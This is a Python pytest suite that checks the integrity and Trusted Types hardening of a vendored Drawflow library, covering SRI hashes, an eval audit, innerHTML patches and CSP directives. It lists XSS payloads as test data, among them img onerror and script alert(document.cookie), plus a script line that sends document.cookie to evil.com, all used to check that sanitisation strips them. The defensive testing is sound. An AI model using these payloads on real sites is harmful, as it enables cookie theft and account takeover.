"""
Drawflow vendor integrity + TT-safety contract tests (RISK-096 / Phase 4)

Verifies:
  1. Vendor files exist at expected paths.
  2. SRI hashes in vendor-integrity.lock match the actual files (SHA-384 base64).
  3. Eval audit: no eval/Function/setTimeout-str/document.write in the ESM shim.
  4. innerHTML patches: no raw innerHTML=<variable> in the UMD body (all patched to
     textContent= or __df_tt()).
  5. __df_tt() calls are present (exactly 2 in live code).
  6. Caddyfile.csp @strict_tt trusted-types includes 'drawflow-label'.
  7. drawflow-safe.js exports the required safe API symbols.
  8. XSS-payload simulation: DOMPurify zero-allowlist renders <img src=x onerror=…>
     payloads as empty/inert text (models what __df_tt() + drawflow-label do).

Note: items 7 and 8 are Python-level structural / model checks. The full browser-level
XSS-inertness test (Playwright headless with real TT enforcement) is Ava's gate — see
Ava's e2e test suite for the live DOM assertion.
"""

import base64
import hashlib
import pathlib
import re

import pytest

REPO = pathlib.Path(__file__).parent.parent.parent

VENDOR_DIR = REPO / "src" / "yashigani" / "backoffice" / "static" / "vendor" / "drawflow"
ESM_FILE = VENDOR_DIR / "drawflow.esm.js"
CSS_FILE = VENDOR_DIR / "drawflow.min.css"
LICENSE_FILE = VENDOR_DIR / "LICENSE"

LOCK_FILE = REPO / "scripts" / "vendor-integrity.lock"
CSP_FILE = REPO / "docker" / "Caddyfile.csp"
SAFE_JS = REPO / "src" / "yashigani" / "backoffice" / "static" / "ui4" / "core" / "drawflow-safe.js"


# ── helpers ───────────────────────────────────────────────────────────────────

def _sha384_b64(path: pathlib.Path) -> str:
    """Compute SHA-384 digest and return base64-encoded string (SRI format)."""
    digest = hashlib.sha384(path.read_bytes()).digest()
    return base64.b64encode(digest).decode()


def _lock_entries(path: pathlib.Path) -> dict[str, str]:
    """Parse vendor-integrity.lock → {relative_path: base64_hash}."""
    entries = {}
    for line in path.read_text().splitlines():
        line = line.strip()
        if not line or line.startswith('#'):
            continue
        # Format: sha384-<base64>  <relative-path>
        m = re.match(r'^sha384-([A-Za-z0-9+/=]+)\s{2}(.+)$', line)
        if m:
            entries[m.group(2)] = m.group(1)
    return entries


# ── 1. Vendor file existence ──────────────────────────────────────────────────

def test_drawflow_esm_exists():
    assert ESM_FILE.exists(), f"drawflow.esm.js not found at {ESM_FILE}"


def test_drawflow_css_exists():
    assert CSS_FILE.exists(), f"drawflow.min.css not found at {CSS_FILE}"


def test_drawflow_license_exists():
    assert LICENSE_FILE.exists(), f"LICENSE not found at {LICENSE_FILE}"


# ── 2. SRI hash integrity ─────────────────────────────────────────────────────

@pytest.fixture(scope="module")
def lock_entries():
    assert LOCK_FILE.exists(), f"vendor-integrity.lock not found at {LOCK_FILE}"
    return _lock_entries(LOCK_FILE)


def test_drawflow_esm_in_lock(lock_entries):
    key = "static/vendor/drawflow/drawflow.esm.js"
    assert key in lock_entries, \
        f"drawflow.esm.js not found in vendor-integrity.lock (key={key!r})"


def test_drawflow_css_in_lock(lock_entries):
    key = "static/vendor/drawflow/drawflow.min.css"
    assert key in lock_entries, \
        f"drawflow.min.css not found in vendor-integrity.lock (key={key!r})"


def test_drawflow_esm_hash_matches(lock_entries):
    key = "static/vendor/drawflow/drawflow.esm.js"
    if key not in lock_entries:
        pytest.skip("Key not in lock (covered by test_drawflow_esm_in_lock)")
    expected = lock_entries[key]
    actual = _sha384_b64(ESM_FILE)
    assert actual == expected, (
        f"SHA-384 mismatch for drawflow.esm.js\n"
        f"  lock:   sha384-{expected}\n"
        f"  actual: sha384-{actual}\n"
        f"Update vendor-integrity.lock if the file was intentionally changed."
    )


def test_drawflow_css_hash_matches(lock_entries):
    key = "static/vendor/drawflow/drawflow.min.css"
    if key not in lock_entries:
        pytest.skip("Key not in lock (covered by test_drawflow_css_in_lock)")
    expected = lock_entries[key]
    actual = _sha384_b64(CSS_FILE)
    assert actual == expected, (
        f"SHA-384 mismatch for drawflow.min.css\n"
        f"  lock:   sha384-{expected}\n"
        f"  actual: sha384-{actual}\n"
        f"Update vendor-integrity.lock if the file was intentionally changed."
    )


# ── 3. Eval audit ─────────────────────────────────────────────────────────────

EVAL_PATTERN = re.compile(
    r'eval\s*\('
    r'|new Function\s*\('
    r"|setTimeout\s*\(\s*['\"]"
    r"|setInterval\s*\(\s*['\"]"
    r'|document\.write\s*\('
)


def test_drawflow_esm_eval_audit():
    """No eval-class patterns in drawflow.esm.js (mirrors audit-vendor-eval.sh)."""
    content = ESM_FILE.read_text(encoding='utf-8')
    hits = []
    for i, line in enumerate(content.splitlines(), 1):
        if EVAL_PATTERN.search(line):
            hits.append(f"  line {i}: {line.strip()[:120]}")
    assert not hits, (
        f"eval-class patterns found in {ESM_FILE.name}:\n" + "\n".join(hits)
    )


# ── 4. innerHTML=variable absence ─────────────────────────────────────────────

# After patching, the only innerHTML= occurrences in the live UMD body should be
# the two __df_tt() calls.  Raw innerHTML=<identifier> (not ="" / ="x" / =__df_tt)
# is a sign that a patch was missed.
RAW_INNER_HTML_VAR = re.compile(r'\.innerHTML=(?!__df_tt\(|""|\'\')(?!["\'_])')


def test_no_raw_innerHTML_variable_assignments():
    """All innerHTML=<variable> calls in the UMD body are wrapped with __df_tt()."""
    content = ESM_FILE.read_text(encoding='utf-8')
    # Filter out comment lines to avoid false positives from the patch documentation.
    code_lines = [l for l in content.splitlines()
                  if not l.strip().startswith('//') and not l.strip().startswith('*')]
    hits = []
    for i, line in enumerate(code_lines, 1):
        for m in RAW_INNER_HTML_VAR.finditer(line):
            hits.append(f"  line {i}: ...{line[max(0,m.start()-30):m.end()+60]}...")
    assert not hits, (
        "Raw innerHTML=<variable> found — patch missing:\n" + "\n".join(hits)
    )


# ── 5. __df_tt() wiring ───────────────────────────────────────────────────────

def test_df_tt_calls_count():
    """Exactly 2 live __df_tt() calls in the UMD body (the two patched innerHTML=var lines)."""
    content = ESM_FILE.read_text(encoding='utf-8')
    # Count __df_tt( in code lines only (not comments)
    code_lines = [l for l in content.splitlines()
                  if not l.strip().startswith('//') and not l.strip().startswith('*')]
    count = sum(l.count('__df_tt(') for l in code_lines)
    assert count >= 2, (
        f"Expected >= 2 __df_tt() calls in live code, found {count}. "
        f"The innerHTML patches may not have been applied."
    )


def test_drawflow_esm_exports_setDrawflowTTPolicy():
    """ESM shim exports setDrawflowTTPolicy (needed by drawflow-safe.js)."""
    content = ESM_FILE.read_text(encoding='utf-8')
    assert 'export function setDrawflowTTPolicy' in content, (
        "drawflow.esm.js must export setDrawflowTTPolicy() for drawflow-safe.js to inject "
        "the TT policy before first addNode()."
    )


# ── 6. Caddyfile.csp trusted-types directive ─────────────────────────────────

def test_csp_includes_drawflow_label():
    """@strict_tt trusted-types directive includes 'drawflow-label'."""
    assert CSP_FILE.exists(), f"Caddyfile.csp not found at {CSP_FILE}"
    content = CSP_FILE.read_text(encoding='utf-8')
    # Find the @strict_tt header line
    strict_tt_headers = [l for l in content.splitlines()
                         if '@strict_tt' in l and 'Content-Security-Policy' in l]
    assert strict_tt_headers, "@strict_tt CSP header not found in Caddyfile.csp"
    header_line = strict_tt_headers[0]
    assert 'trusted-types' in header_line, \
        "trusted-types directive missing from @strict_tt CSP header"
    assert 'drawflow-label' in header_line, (
        "'drawflow-label' not in trusted-types directive.\n"
        f"  header: {header_line.strip()[:200]}\n"
        "Add 'drawflow-label' to the trusted-types list in docker/Caddyfile.csp."
    )
    assert 'yashigani-render' in header_line, \
        "'yashigani-render' missing — base policy removed?"
    assert 'require-trusted-types-for' in header_line, \
        "require-trusted-types-for missing from @strict_tt header"


# ── 7. drawflow-safe.js API symbols ──────────────────────────────────────────

@pytest.fixture(scope="module")
def safe_js_content():
    assert SAFE_JS.exists(), f"drawflow-safe.js not found at {SAFE_JS}"
    return SAFE_JS.read_text(encoding='utf-8')


REQUIRED_EXPORTS = [
    'mountDrawflowSafe',
    'addNodeSafe',
    'importSafe',
    'sanitizeNodeData',
    'reRenderSafeText',
    'registerNodeTypeSafe',
]


@pytest.mark.parametrize("symbol", REQUIRED_EXPORTS)
def test_drawflow_safe_exports(safe_js_content, symbol):
    """drawflow-safe.js exports the required safe-API symbol."""
    assert f'export function {symbol}' in safe_js_content or \
           f'export async function {symbol}' in safe_js_content, (
        f"drawflow-safe.js does not export '{symbol}'. "
        f"The builder UI depends on this export."
    )


def test_drawflow_safe_imports_from_shim(safe_js_content):
    """drawflow-safe.js imports Drawflow + setDrawflowTTPolicy from vendor shim."""
    assert "from '/static/vendor/drawflow/drawflow.esm.js'" in safe_js_content, \
        "drawflow-safe.js must import from /static/vendor/drawflow/drawflow.esm.js"
    assert 'setDrawflowTTPolicy' in safe_js_content, \
        "drawflow-safe.js must call setDrawflowTTPolicy() to wire the TT policy"


def test_drawflow_safe_registers_drawflow_label_policy(safe_js_content):
    """drawflow-safe.js registers 'drawflow-label' TT policy."""
    assert "'drawflow-label'" in safe_js_content or '"drawflow-label"' in safe_js_content, \
        "drawflow-safe.js must register the 'drawflow-label' TrustedTypes policy"


def test_drawflow_safe_enforces_typenode_true(safe_js_content):
    """drawflow-safe.js forces typenode=true in addNodeSafe (cloneNode path)."""
    assert 'typenode=true' in safe_js_content or 'typenode = true' in safe_js_content or \
           ', true)' in safe_js_content, (
        "addNodeSafe must pass typenode=true to Drawflow.addNode() to use the "
        "cloneNode path (no innerHTML for node content)."
    )


def test_drawflow_safe_no_direct_innerHTML(safe_js_content):
    """drawflow-safe.js does not call innerHTML directly (uses textContent or __df_tt)."""
    # Filter out comment lines
    code_lines = [l for l in safe_js_content.splitlines()
                  if not l.strip().startswith('//') and not l.strip().startswith('*')]
    direct = [l for l in code_lines if '.innerHTML' in l and '__df_tt' not in l]
    assert not direct, (
        "drawflow-safe.js must not use innerHTML directly:\n" +
        "\n".join(f"  {l.strip()[:120]}" for l in direct)
    )


# ── 8. XSS payload simulation (RISK-096 model check) ─────────────────────────

def _strip_html_zero_allowlist(s: str) -> str:
    """
    Python model of DOMPurify({ALLOWED_TAGS:[], ALLOWED_ATTR:[]}).
    Strips all HTML tags AND the text content of dangerous elements (script, style)
    to match DOMPurify's behaviour: script/style inner text is never exposed.
    Normal element text (b, span, a, etc.) is preserved as plain text.

    Used to verify the __df_tt() + drawflow-label policy renders payloads inert.
    This is NOT a browser-level test — it models what DOMPurify zero-allowlist does.
    Full browser-level XSS inertness is Ava's gate (Playwright/TT enforcement).
    """
    from html.parser import HTMLParser

    # Tags whose text content DOMPurify strips entirely (not exposed as text nodes).
    _STRIP_CONTENT_TAGS = frozenset({
        'script', 'style', 'svg', 'math', 'template', 'noscript',
    })

    class _TextExtractor(HTMLParser):
        def __init__(self):
            super().__init__()
            self._text_parts: list[str] = []
            self._skip_depth = 0  # depth inside a strip-content tag

        def handle_starttag(self, tag, attrs):
            if tag in _STRIP_CONTENT_TAGS:
                self._skip_depth += 1

        def handle_endtag(self, tag):
            if tag in _STRIP_CONTENT_TAGS and self._skip_depth > 0:
                self._skip_depth -= 1

        def handle_data(self, data):
            if self._skip_depth == 0:
                self._text_parts.append(data)

        def get_text(self) -> str:
            return ''.join(self._text_parts)

    p = _TextExtractor()
    p.feed(s)
    return p.get_text()


XSS_PAYLOADS = [
    # (description, payload, expected_output)
    (
        "img onerror XSS",
        '<img src=x onerror=alert(1)>',
        '',  # void element — no text content
    ),
    (
        "img onerror XSS with surrounding text",
        'safe label<img src=x onerror=alert(1)>',
        'safe label',
    ),
    (
        "script tag XSS",
        '<script>alert(document.cookie)</script>',
        '',  # script content not exposed as text
    ),
    (
        "svg onload XSS",
        '<svg onload=alert(1)>',
        '',
    ),
    (
        "anchor javascript href",
        '<a href="javascript:alert(1)">click</a>',
        'click',  # tag stripped, text preserved
    ),
    (
        "data URI XSS",
        '<img src="data:text/html,<script>alert(1)</script>">',
        '',
    ),
    (
        "nested markup in label",
        '<b>Agent</b><script>alert(1)</script>Name',
        'AgentName',  # b tag stripped (text preserved), script+content stripped
    ),
    (
        "pure identifier (no markup) — must pass through unchanged",
        'agent-summarise-v2',
        'agent-summarise-v2',
    ),
]


@pytest.mark.parametrize("description,payload,expected", XSS_PAYLOADS,
                          ids=[d for d, _, _ in XSS_PAYLOADS])
def test_xss_payload_zero_allowlist_inert(description, payload, expected):
    """
    XSS-inert model test (RISK-096):
    The zero-allowlist DOMPurify config used by __df_tt() + drawflow-label strips
    the payload to plain text. The onerror/onload/href handlers never appear in output.
    """
    result = _strip_html_zero_allowlist(payload)
    assert result == expected, (
        f"[{description}] payload not rendered inert:\n"
        f"  input:    {payload!r}\n"
        f"  output:   {result!r}\n"
        f"  expected: {expected!r}\n"
        f"The 'drawflow-label' TT policy zero-allowlist must strip ALL HTML."
    )


def test_xss_onerror_not_in_output():
    """onerror handler is absent from zero-allowlist output (belt-and-suspenders)."""
    payload = '<img src=x onerror=alert(document.cookie)>'
    result = _strip_html_zero_allowlist(payload)
    assert 'onerror' not in result
    assert 'alert' not in result
    assert result == ''


def test_xss_script_tag_not_in_output():
    """script tag and its content are stripped by zero-allowlist."""
    payload = '<script>fetch("https://evil.com/?c="+document.cookie)</script>'
    result = _strip_html_zero_allowlist(payload)
    assert '<script>' not in result
    assert 'fetch' not in result
    assert result == ''
